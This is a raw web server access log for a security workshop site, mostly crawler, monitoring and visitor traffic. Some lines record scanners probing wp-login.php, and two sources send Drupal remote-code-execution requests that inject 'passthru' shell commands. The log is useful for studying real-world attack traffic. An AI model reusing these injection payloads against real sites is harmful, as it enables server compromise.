189.47.240.112 - - [27/Apr/2018:11:24:01 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
189.47.240.112 - - [27/Apr/2018:11:24:01 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
187.190.154.163 - - [27/Apr/2018:11:24:02 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
187.190.154.163 - - [27/Apr/2018:11:24:02 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [27/Apr/2018:11:24:22 -0400] "GET /2014/program HTTP/1.1" 200 7896 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
190.139.243.69 - - [27/Apr/2018:11:24:32 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
190.139.243.69 - - [27/Apr/2018:11:24:34 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [27/Apr/2018:11:24:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [27/Apr/2018:11:25:27 -0400] "GET /2006/dates.shtml HTTP/1.1" 200 4949 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.70.40.11 - - [27/Apr/2018:11:25:58 -0400] "GET /robots.txt HTTP/1.1" 200 4286 "-" "Mozilla/5.0 (compatible) SemanticScholarBot (+https://www.semanticscholar.org/crawler)"
54.175.129.53 - - [27/Apr/2018:11:26:10 -0400] "GET /robots.txt HTTP/1.1" 200 4392 "-" "Mozilla/5.0/Firefox/42.0 - nbertaupete95(at)gmail.com"
54.175.129.53 - - [27/Apr/2018:11:26:10 -0400] "GET /robots.txt HTTP/1.0" 200 1125 "-" "Mozilla/5.0/Firefox/42.0 - nbertaupete95(at)gmail.com"
54.175.129.53 - - [27/Apr/2018:11:26:10 -0400] "GET / HTTP/1.0" 200 3520 "-" "Mozilla/5.0/Firefox/42.0 - nbertaupete95(at)gmail.com"
80.55.215.43 - - [27/Apr/2018:11:26:27 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
80.55.215.43 - - [27/Apr/2018:11:26:28 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.89 - - [27/Apr/2018:11:26:32 -0400] "GET /2006/program.shtml HTTP/1.1" 200 6273 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [27/Apr/2018:11:27:37 -0400] "GET /2009/proceedings/1997/nspw1997-nelson.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [27/Apr/2018:11:28:42 -0400] "GET /2005/dates.shtml HTTP/1.1" 200 4968 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
185.212.170.40 - - [27/Apr/2018:11:29:04 -0400] "POST /?q=user/password&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&name%5B%23markup%5D=echo+%22%2F%2FjQuery%22+%3E+misc%2Fprint.js HTTP/1.1" 200 11406 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
185.212.170.40 - - [27/Apr/2018:11:29:07 -0400] "POST /?q=file/ajax/name/%23value/form-m16UfflgHpHD974-f4-s6FuWEj7FAkRYrunKOG2CTaE HTTP/1.1" 200 5465 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
185.212.170.40 - - [27/Apr/2018:11:29:09 -0400] "GET /misc/print.js HTTP/1.1" 404 4137 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0"
103.217.111.131 - - [27/Apr/2018:11:29:15 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
103.217.111.131 - - [27/Apr/2018:11:29:17 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [27/Apr/2018:11:29:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
157.55.39.56 - - [27/Apr/2018:11:30:31 -0400] "GET /2007/index.shtml HTTP/1.1" 200 5910 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.73.91 - - [27/Apr/2018:11:30:52 -0400] "GET /proceedings/2005 HTTP/1.1" 200 7168 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:31:56 -0400] "GET /2001/pc.html HTTP/1.1" 304 3603 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.149 - - [27/Apr/2018:11:32:14 -0400] "GET /2010 HTTP/1.1" 200 7418 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
42.236.102.201 - - [27/Apr/2018:11:32:26 -0400] "GET /papers/2008/nspw2008-beautement.pdf HTTP/1.1" 200 145199 "https://www.nspw.org/papers/2008/nspw2008-beautement.pdf" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
66.249.73.91 - - [27/Apr/2018:11:33:02 -0400] "GET /papers/2009/nspw2009-probst.pdf HTTP/1.1" 200 205895 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:34:06 -0400] "GET /2014/cfp HTTP/1.1" 200 8286 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [27/Apr/2018:11:34:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [27/Apr/2018:11:35:11 -0400] "GET /papers/2000/nspw2000-mcdermott.pdf HTTP/1.1" 200 378051 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [27/Apr/2018:11:36:16 -0400] "GET /papers/1993/nspw1993-slack.pdf HTTP/1.1" 200 519861 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
78.252.120.43 - - [27/Apr/2018:11:36:29 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
78.252.120.43 - - [27/Apr/2018:11:36:29 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [27/Apr/2018:11:37:06 -0400] "GET /2006/papers.shtml HTTP/1.1" 200 4851 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
39.35.134.40 - - [27/Apr/2018:11:37:06 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
39.35.134.40 - - [27/Apr/2018:11:37:07 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [27/Apr/2018:11:37:16 -0400] "GET /node/56 HTTP/1.1" 200 8825 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [27/Apr/2018:11:37:21 -0400] "GET /papers/2010/nspw2010-raskin.pdf HTTP/1.1" 200 610901 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:38:26 -0400] "GET /papers/2009/nspw2009-church.pdf HTTP/1.1" 200 283643 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.144 - - [27/Apr/2018:11:38:32 -0400] "GET /papers/1994/nspw1994-ferris.pdf HTTP/1.1" 200 509031 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
129.2.180.189 - - [27/Apr/2018:11:39:00 -0400] "GET /2009/proceedings/2009/nspw2009-herley.pdf HTTP/1.1" 200 189209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
129.2.180.189 - - [27/Apr/2018:11:39:01 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "https://www.nspw.org/2009/proceedings/2009/nspw2009-herley.pdf" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
66.249.73.91 - - [27/Apr/2018:11:39:31 -0400] "GET /papers/2012/docs/p87.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [27/Apr/2018:11:39:33 -0400] "GET /2002/pc.content HTTP/1.1" 200 6006 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [27/Apr/2018:11:39:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [27/Apr/2018:11:39:46 -0400] "GET /2008/cfp2008.pdf HTTP/1.1" 200 19149 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [27/Apr/2018:11:40:36 -0400] "GET /papers/1996/nspw1996-josang.pdf HTTP/1.1" 200 1238524 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [27/Apr/2018:11:41:03 -0400] "GET /2010/cfp HTTP/1.1" 200 8332 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
125.209.235.185 - - [27/Apr/2018:11:41:13 -0400] "GET /2012/local HTTP/1.1" 200 6658 "-" "Mozilla/5.0 (compatible; Yeti/1.1; +http://naver.me/spd)"
66.249.73.89 - - [27/Apr/2018:11:41:41 -0400] "GET /2005/cfp/latex/macros.sty HTTP/1.1" 200 14425 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [27/Apr/2018:11:42:45 -0400] "GET /2017/accepted HTTP/1.1" 200 6762 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:43:50 -0400] "GET /papers/2013/nspw2013-mathur.pdf HTTP/1.1" 200 1319255 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.236 - - [27/Apr/2018:11:44:25 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [27/Apr/2018:11:44:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [27/Apr/2018:11:44:55 -0400] "GET /papers/2013/nspw2013-crane.pdf HTTP/1.1" 200 1891421 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [27/Apr/2018:11:46:00 -0400] "GET /papers/2005/nspw2005-thorpe.pdf HTTP/1.1" 200 3949092 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
180.23.174.51 - - [27/Apr/2018:11:46:51 -0400] "GET /2018 HTTP/1.1" 200 12606 "-" "LWP::Simple/6.29 libwww-perl/6.29"
66.249.73.91 - - [27/Apr/2018:11:47:13 -0400] "GET /2013 HTTP/1.1" 200 6797 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [27/Apr/2018:11:40:01 -0400] "GET /papers/2005/nspw2005-mcdermott.pdf HTTP/1.1" 200 3016112 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [27/Apr/2018:11:47:31 -0400] "GET /2003/program.shtml HTTP/1.1" 200 6375 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [27/Apr/2018:11:47:33 -0400] "GET /2005/proceedings.content HTTP/1.1" 200 299 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [27/Apr/2018:11:47:36 -0400] "GET /2004/cfp.content HTTP/1.1" 200 3649 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [27/Apr/2018:11:48:10 -0400] "GET /papers/2001/nspw2001-weirich.pdf HTTP/1.1" 200 720355 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.89 - - [27/Apr/2018:11:49:14 -0400] "GET /2009/proceedings/1997/nspw1997-hinton.pdf HTTP/1.1" 304 3606 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [27/Apr/2018:11:49:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
150.140.149.206 - - [27/Apr/2018:11:49:45 -0400] "GET /wp-login.php HTTP/1.1" 404 7903 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
150.140.149.206 - - [27/Apr/2018:11:49:45 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [27/Apr/2018:11:42:31 -0400] "GET /papers/2005/nspw2005-mcdermott.pdf HTTP/1.1" 200 2828780 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [27/Apr/2018:11:50:20 -0400] "GET /papers/1999/nspw1999-lipson.pdf HTTP/1.1" 200 653276 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.89 - - [27/Apr/2018:11:51:24 -0400] "GET /2009/proceedings/2010/nspw2010-bishop.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
37.210.189.200 - - [27/Apr/2018:11:52:25 -0400] "GET /wp-login.php HTTP/1.1" 404 7782 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
37.210.189.200 - - [27/Apr/2018:11:52:26 -0400] "GET / HTTP/1.1" 200 8266 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [27/Apr/2018:11:45:01 -0400] "GET /papers/2005/nspw2005-mcdermott.pdf HTTP/1.1" 200 2715542 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.91 - - [27/Apr/2018:11:52:29 -0400] "GET /2009/proceedings/1998/nspw1998-chang.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
178.138.97.218 - - [27/Apr/2018:11:52:54 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
178.138.97.218 - - [27/Apr/2018:11:52:55 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [27/Apr/2018:11:53:34 -0400] "GET /2009/proceedings/2010/nspw2010-coles.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [27/Apr/2018:11:54:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.89 - - [27/Apr/2018:11:54:39 -0400] "GET /2009/proceedings/1993/nspw1993-dobson.pdf HTTP/1.1" 200 1283187 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [27/Apr/2018:11:55:44 -0400] "GET /papers/2010/nspw2010-vancleeff.pdf HTTP/1.1" 200 418639 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
91.121.113.106 - - [27/Apr/2018:11:56:05 -0400] "HEAD / HTTP/1.1" 200 3626 "http://nspw.org" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; MDA Pro/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1)"
91.121.113.106 - - [27/Apr/2018:11:56:06 -0400] "GET /?name%5B%23markup%5D=echo+-n+j52qvmxiag1pv2ca+%7C+md5sum&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&q=user%2Fpassword HTTP/1.1" 200 2641 "http://nspw.org/?name%5B%23markup%5D=echo+-n+j52qvmxiag1pv2ca+%7C+md5sum&name%5B%23post_render%5D%5B%5D=passthru&name%5B%23type%5D=markup&q=user%2Fpassword" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; MDA Pro/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1)"
91.121.113.106 - - [27/Apr/2018:11:56:06 -0400] "GET /?q=file%2Fajax%2Fname%2F%23value%2Fform-w8ehYcD0RiJ9jHz9zB1EBtOVqkDJD3S3BrjZbadGR54 HTTP/1.1" 200 852 "http://nspw.org/?q=file%2Fajax%2Fname%2F%23value%2Fform-w8ehYcD0RiJ9jHz9zB1EBtOVqkDJD3S3BrjZbadGR54" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; PPC; MDA Pro/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1)"
66.249.73.87 - - [27/Apr/2018:11:56:48 -0400] "GET /2009/cfp2009.pdf HTTP/1.1" 304 3604 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
122.177.27.25 - - [27/Apr/2018:11:57:35 -0400] "GET / HTTP/1.1" 200 6458 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.0 Mobile/14G60 Safari/602.1"
122.177.27.25 - - [27/Apr/2018:11:57:37 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3976 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.27.25 - - [27/Apr/2018:11:57:38 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.27.25 - - [27/Apr/2018:11:57:38 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.27.25 - - [27/Apr/2018:11:57:39 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.27.25 - - [27/Apr/2018:11:57:39 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.27.25 - - [27/Apr/2018:11:57:40 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.27.25 - - [27/Apr/2018:11:57:40 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.27.25 - - [27/Apr/2018:11:57:40 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.27.25 - - [27/Apr/2018:11:57:41 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
122.177.27.25 - - [27/Apr/2018:11:57:41 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/602.1 CFNetwork/811.5.4 Darwin/16.7.0"
66.249.73.87 - - [27/Apr/2018:11:57:54 -0400] "GET /papers/2007/nspw2007-nali.pdf HTTP/1.1" 200 878633 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
76.85.147.206 - - [27/Apr/2018:11:58:04 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
76.85.147.206 - - [27/Apr/2018:11:58:04 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.87 - - [27/Apr/2018:11:58:58 -0400] "GET /papers/2007/nspw2007-solworth.pdf HTTP/1.1" 200 384581 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [27/Apr/2018:11:59:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
95.178.209.157 - - [27/Apr/2018:11:59:44 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
95.178.209.157 - - [27/Apr/2018:11:59:44 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.73.91 - - [27/Apr/2018:12:00:03 -0400] "GET /2003/program.shtml HTTP/1.1" 200 6346 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.87 - - [27/Apr/2018:12:01:08 -0400] "GET /2003/dates.shtml HTTP/1.1" 200 4931 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
184.105.139.68 - - [27/Apr/2018:12:01:51 -0400] "GET / HTTP/1.1" 200 11408 "-" "-"
66.249.73.91 - - [27/Apr/2018:12:02:13 -0400] "GET /2015/accepted HTTP/1.1" 200 6932 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
212.252.84.28 - - [27/Apr/2018:12:03:00 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
212.252.84.28 - - [27/Apr/2018:12:03:02 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
123.125.67.218 - - [27/Apr/2018:12:03:17 -0400] "GET /robots.txt HTTP/1.1" 200 5923 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
66.249.73.87 - - [27/Apr/2018:12:03:18 -0400] "GET /papers/2007/nspw2007-chow.pdf HTTP/1.1" 200 420040 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.73.91 - - [27/Apr/2018:12:04:22 -0400] "GET /cfp/nspw2016-cfp.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.200 - - [27/Apr/2018:12:04:30 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [27/Apr/2018:12:04:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [27/Apr/2018:12:05:27 -0400] "GET /2001/cfp.html HTTP/1.1" 200 6336 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
77.88.47.40 - - [27/Apr/2018:12:06:03 -0400] "GET /2016/location HTTP/1.1" 200 7701 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
77.88.47.40 - - [27/Apr/2018:12:06:52 -0400] "GET /2006/index.shtml HTTP/1.1" 200 5377 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.87 - - [27/Apr/2018:12:07:37 -0400] "GET /papers/1993/nspw1993-rooker-2.pdf HTTP/1.1" 200 572187 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
138.246.253.19 - - [27/Apr/2018:12:08:25 -0400] "HEAD / HTTP/1.1" 200 3806 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36"
77.88.47.40 - - [27/Apr/2018:12:08:40 -0400] "GET /2004/past.content HTTP/1.1" 200 5294 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
66.249.73.89 - - [27/Apr/2018:12:08:42 -0400] "GET /papers/2004/nspw2004-hollebeek.pdf HTTP/1.1" 200 120240 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
186.151.60.145 - - [27/Apr/2018:12:08:55 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
157.55.39.207 - - [27/Apr/2018:12:08:33 -0400] "GET /2009/proceedings/2007/nspw2007-frontmatter.pdf HTTP/1.1" 200 658679 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
186.151.60.145 - - [27/Apr/2018:12:08:56 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [27/Apr/2018:12:09:38 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.73.91 - - [27/Apr/2018:12:09:47 -0400] "GET /papers/1997/nspw1997-somayaji-scanned.pdf HTTP/1.1" 200 1195254 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
109.93.91.48 - - [27/Apr/2018:12:09:49 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
137.112.228.68 - - [27/Apr/2018:12:09:49 -0400] "GET /papers/2007/nspw2007-mannan.pdf HTTP/1.1" 200 502385 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Version/11.0 Mobile/15D60 Safari/604.1"
137.112.228.68 - - [27/Apr/2018:12:09:49 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
137.112.228.68 - - [27/Apr/2018:12:09:49 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/894 Darwin/17.4.0"
